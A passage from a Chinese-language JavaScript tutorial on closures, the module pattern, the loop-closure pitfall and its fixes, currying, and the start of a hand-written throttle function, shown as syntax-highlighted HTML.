&#125;,</span><br><span class="line">    <span class="attr">value</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> privateCounter;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Counter1 = makeCounter();</span><br><span class="line"><span class="keyword">var</span> Counter2 = makeCounter();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 0 */</span></span><br><span class="line">Counter1.increment();</span><br><span class="line">Counter1.increment();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 2 */</span></span><br><span class="line">Counter1.decrement();</span><br><span class="line"><span class="built_in">console</span>.log(Counter1.value()); <span class="comment">/* logs 1 */</span></span><br><span class="line"><span class="built_in">console</span>.log(Counter2.value()); <span class="comment">/* logs 0 */</span></span><br></pre></td></tr></table></figure><p>请注意两个计数器 <code>Counter1</code> 和 <code>Counter2</code> 是如何维护它们各自的独立性的。</p><p><strong>每个闭包都是引用自己词法作用域内的变量</strong> <code>privateCounter</code> 。</p><p>每次调用其中一个计数器时，通过改变这个变量的值，会改变这个闭包的词法环境。</p><p>然而<strong>在一个闭包内对变量的修改，不会影响到另外一个闭包中的变量</strong>。</p><p><strong>备注：</strong>以这种方式使用闭包，提供了许多与面向对象编程相关的好处 —— 特别是<strong>数据隐藏和封装</strong>。</p><blockquote><p>定义JS模块</p></blockquote><ul><li>具有特定功能的js文件。</li><li>将所有的数据和功能都封装在一个函数内部(私有的)。</li><li>只向外暴露一个包含n个方法的对象或函数。</li><li>模块的使用者, 只需要通过模块暴露的对象调用方法来实现对应的功能。</li></ul><p>模块定义:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//myModule.js</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//私有数据</span></span><br><span class="line">  <span class="keyword">var</span> msg = <span class="string">&#x27;My atguigu&#x27;</span></span><br><span class="line">  <span class="comment">//操作数据的函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;doSomething() &#x27;</span>+msg.toUpperCase())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doOtherthing</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;doOtherthing() &#x27;</span>+msg.toLowerCase())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外暴露对象(给外部使用的方法)</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">doSomething</span>: doSomething,</span><br><span class="line">    <span class="attr">doOtherthing</span>: doOtherthing</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------</span><br><span class="line"><span class="comment">// myModule2.js   </span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">//私有数据</span></span><br><span class="line">  <span class="keyword">var</span> msg = <span class="string">&#x27;My atguigu&#x27;</span></span><br><span class="line">  <span class="comment">//操作数据的函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;doSomething() &#x27;</span>+msg.toUpperCase())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">doOtherthing</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;doOtherthing() &#x27;</span>+msg.toLowerCase())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//向外暴露对象(给外部使用的方法)</span></span><br><span class="line">  <span class="built_in">window</span>.myModule2 = &#123;</span><br><span class="line">    <span class="attr">doSomething</span>: doSomething,</span><br><span class="line">    <span class="attr">doOtherthing</span>: doOtherthing</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>模块调用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//调用示例</span><br><span class="line">------------  模块调用1 --------------------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;myModule.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> <span class="built_in">module</span> = myModule()</span></span><br><span class="line"><span class="javascript">  <span class="built_in">module</span>.doSomething()</span></span><br><span class="line"><span class="javascript">  <span class="built_in">module</span>.doOtherthing()</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">------------  模块调用2 --------------------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;myModule2.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line">  myModule2.doSomething()</span><br><span class="line">  myModule2.doOtherthing()</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="在循环中创建闭包"><a href="#在循环中创建闭包" class="headerlink" title="在循环中创建闭包"></a>在循环中创建闭包</h3><p>在 ECMAScript 2015 引入 <code>let</code> 关键字之前，在循环中有一个常见的闭包创建问题。参考下面的示例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;help&quot;</span>&gt;</span>Helpful notes will appear here<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>E-mail: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Age: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;age&quot;</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;help&#x27;</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your e-mail address&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your full name&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your age (you must be over 16)&#x27;</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> item = helpText[i];</span><br><span class="line">    <span class="built_in">document</span>.getElementById(item.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      showHelp(item.help);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure><p>数组 <code>helpText</code> 中定义了三个有用的提示信息，每一个都关联于对应的文档中的<code>input</code> 的 ID。通过循环这三项定义，依次为相应<code>input</code>添加了一个 <code>onfocus</code> 事件处理函数，以便显示帮助信息。</p><p>运行这段代码后，您会发现它没有达到想要的效果。无论焦点在哪个<code>input</code>上，显示的都是关于年龄的信息。</p><p>原因是赋值给 <code>onfocus</code> 的是闭包。这些闭包是由他们的函数定义和在 <code>setupHelp</code> 作用域中捕获的环境所组成的。</p><p>这三个闭包在循环中被创建，但他们<strong>共享了同一个词法作用域</strong>，在这个作用域中存在一个变量item。</p><p>这是因为变量<code>item</code>使用<code>var</code>进行声明，由于<strong>变量提升</strong>，所以具有<strong>函数作用域</strong>。当<code>onfocus</code>的回调执行时，<code>item.help</code>的值被决定。由于循环在事件触发之前早已执行完毕，变量对象<code>item</code>（被三个闭包所共享）已经指向了<code>helpText</code>的最后一项。</p><p>解决这个问题的一种方案是使用更多的闭包：特别是使用前面所述的函数工厂：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;help&#x27;</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeHelpCallback</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    showHelp(help);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your e-mail address&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your full name&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your age (you must be over 16)&#x27;</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> item = helpText[i];</span><br><span class="line">    <span class="built_in">document</span>.getElementById(item.id).onfocus = makeHelpCallback(item.help);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure><p>这段代码可以如我们所期望的那样工作。所有的回调不再共享同一个环境， <code>makeHelpCallback</code> 函数为每一个回调创建一个新的词法环境。在这些环境中，<code>help</code> 指向 <code>helpText</code> 数组中对应的字符串。</p><p>另一种方法使用了匿名闭包：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;help&#x27;</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your e-mail address&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your full name&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your age (you must be over 16)&#x27;</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">var</span> item = helpText[i];</span><br><span class="line">       <span class="built_in">document</span>.getElementById(item.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         showHelp(item.help);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;)(); <span class="comment">// 马上把当前循环项的item与事件回调相关联起来</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure><p>如果不想使用过多的闭包，你可以用ES2015引入的let关键词：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;help&#x27;</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your e-mail address&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your full name&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your age (you must be over 16)&#x27;</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; helpText.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> item = helpText[i];</span><br><span class="line">    <span class="built_in">document</span>.getElementById(item.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      showHelp(item.help);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure><p>这个例子使用<code>let</code>而不是<code>var</code>，因此<strong>每个闭包都绑定了块作用域的变量，这意味着不再需要额外的闭包</strong>。</p><p>另一个可选方案是使用 <code>forEach()</code>来遍历<code>helpText</code>数组并给每一个<code>&lt;p&gt;</code>添加一个监听器，如下所示：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showHelp</span>(<span class="params">help</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;help&#x27;</span>).innerHTML = help;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setupHelp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> helpText = [</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your e-mail address&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your full name&#x27;</span>&#125;,</span><br><span class="line">      &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;help&#x27;</span>: <span class="string">&#x27;Your age (you must be over 16)&#x27;</span>&#125;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">  helpText.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(text.id).onfocus = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      showHelp(text.help);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setupHelp();</span><br></pre></td></tr></table></figure><h3 id="高阶函数与柯里化"><a href="#高阶函数与柯里化" class="headerlink" title="高阶函数与柯里化"></a>高阶函数与柯里化</h3><blockquote><p>高阶函数是对其他函数进行操作的函数，操作可以是将它们作为参数，或者是返回它们。 简单来说，高阶函数是一个接收函数作为参数或将函数作为输出返回的函数。</p></blockquote><p>下面是一个更有意思的示例 — 一个 <code>makeAdder</code> 函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeAdder</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> add5 = makeAdder(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> add10 = makeAdder(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add5(<span class="number">2</span>));  <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">console</span>.log(add10(<span class="number">2</span>)); <span class="comment">// 12</span></span><br></pre></td></tr></table></figure><p>在这个示例中，我们定义了 <code>makeAdder(x)</code> 函数，它接受一个参数 <code>x</code> ，并返回一个新的函数。返回的函数接受一个参数 <code>y</code>，并返回<code>x+y</code>的值。</p><p>从本质上讲，<code>makeAdder</code> 是一个<strong>函数工厂</strong> — 他创建了将指定的值和它的参数相加求和的函数。在上面的示例中，我们使用函数工厂创建了两个新函数 — 一个将其参数和 5 求和，另一个和 10 求和。</p><p><code>add5</code> 和 <code>add10</code> 都是闭包。它们共享相同的函数定义，但是保存了不同的词法环境。</p><p>在 <code>add5</code> 的环境中，<code>x</code> 为 5。而在 <code>add10</code> 中，<code>x</code> 则为 10。</p><p>其实可以把它理解成，柯里化后，<code>将第一个参数变量存在函数里面了(闭包)</code>，然后本来需要n个参数的函数可以变成只需要剩下的（n - 1个）参数就可以调用，比如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> add = <span class="function"><span class="params">x</span> =&gt;</span> <span class="function"><span class="params">y</span> =&gt;</span> x + y</span><br><span class="line"><span class="keyword">let</span> add2 = add(<span class="number">2</span>)</span><br><span class="line">-*----------------------------------</span><br><span class="line">本来完成 add 这个操作，应该是这样调用</span><br><span class="line"><span class="keyword">let</span> add = <span class="function">(<span class="params">x, y</span>) =&gt;</span> x + y</span><br><span class="line">add(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">----------------------------------</span><br><span class="line"><span class="number">1.</span> 而现在 add2 函数完成同样操作只需要一个参数，这在函数式编程中广泛应用。</span><br><span class="line"><span class="keyword">let</span> add = <span class="function"><span class="params">x</span> =&gt;</span> <span class="function"><span class="params">y</span> =&gt;</span> x + y</span><br><span class="line"><span class="keyword">let</span> add2 = add(<span class="number">2</span>)</span><br><span class="line"><span class="number">2.</span>详细解释一下，就是 add2 函数 等价于 有了 x 这个闭包变量的 y =&gt; x + y 函数,并且此时 x = <span class="number">2</span>，所以此时调用</span><br><span class="line">add2(<span class="number">3</span>) === <span class="number">2</span> + <span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="节流与防抖"><a href="#节流与防抖" class="headerlink" title="节流与防抖"></a>节流与防抖</h3><p> <code>throttle</code> 与<code>debounce</code> 是开发中常用的<strong>高阶函数</strong>，作用都是为了<strong>防止函数被高频调用，换句话说就是，用来控制某个函数在一定时间内执行多少次。</strong></p><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>比如绑定响应鼠标移动、窗口大小调整、滚屏等事件时，绑定的函数触发的频率会很频繁。若处理函数稍微复杂，需要较多的运算执行时间和资源，往往会出现延迟，甚至导致假死或者卡顿感。为了优化性能，这时就很有必要使用 <code>throttle</code> 与<code>debounce</code> 了。</p><h4 id="throttle与debounce区别"><a href="#throttle与debounce区别" class="headerlink" title="throttle与debounce区别"></a>throttle与debounce区别</h4><p>节流（<strong>throttle</strong>）：限制目标函数调用的<strong>频率</strong>，比如：1s内不能调用2次。</p><p>防抖 （<strong>debounce</strong>） ：多次触发，只在最后<strong>一次触发</strong>时，执行目标函数。</p><h4 id="手写一个-throttle"><a href="#手写一个-throttle" class="headerlink" title="手写一个 throttle"></a>手写一个 throttle</h4><p>实现方案有以下两种：</p><ul><li>第一种是用<strong>时间戳</strong>来判断是否已到执行时间，记录上次执行的时间戳，然后每次触发事件执行回调，<strong>回调中判断当前时间戳距离上次执行时间戳的间隔是否已经达到时间差</strong>（Xms） ，如果是则执行，并更新上次执行的时间戳，如此循环。</li><li>第二种方法是使用定时器，比如当 <code>scroll</code> 事件刚触发时，打印一个 <em>hello world</em>，然后设置个 <code>1000ms</code> 的定时器，此后每次触发 <code>scroll</code> 事件触发回调，如果已经存在定时器，则回调不执行方法，直到定时器触发，<code>handler</code> 被清除，然后重新设置定时器。</li></ul><p>这里我们采用第一种方案来实现，通过闭包保存一个 <code>previous</code> 变量，每次触发 <code>throttle</code> 函数时判断当前时间和 <code>previous</code> 的时间差，如果这段时间差小于等待时间，那就忽略本次事件触发。如果大于等待时间就把 <code>previous</code> 设置为当前时间并执行函数 fn。</p><p>高阶函数，每次触发事件才执行回调</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fn 是需要执行的函数</span></span><br><span class="line"><span class="comment">// wait 是时间间隔</span></span><br><span class="line"><span class="keyword">const</span> throttle = <span class="function">(<span class="params">fn, wait = <span class="number">50</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 上一次执行 fn 的时间</span></span><br><span class="line">  <span class="keyword">let</span> previous = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 将 throttle 处理结果当作函数返回</span></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 获取当前时间，转换成时间戳，单位毫秒</span></span><br><span class="line">    <span class="keyword">let</span> now = +<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="comment">// 将当前时间和上一次执行函数的时间进行对比</span></span><br><span class="line">    <span class="comment">// 大于等待时间就把 previous 设置为当前时间并执行函数 fn</span></span><br><span class="line">    <span class="keyword">if</span> (now - previous &gt; wait) &#123;</span><br><span class="line">      previous = now;</span><br><span class="line">      fn.apply(<span class="built_in">this</span>, args);</span><br><span class="line">    &#125;</span><br><span 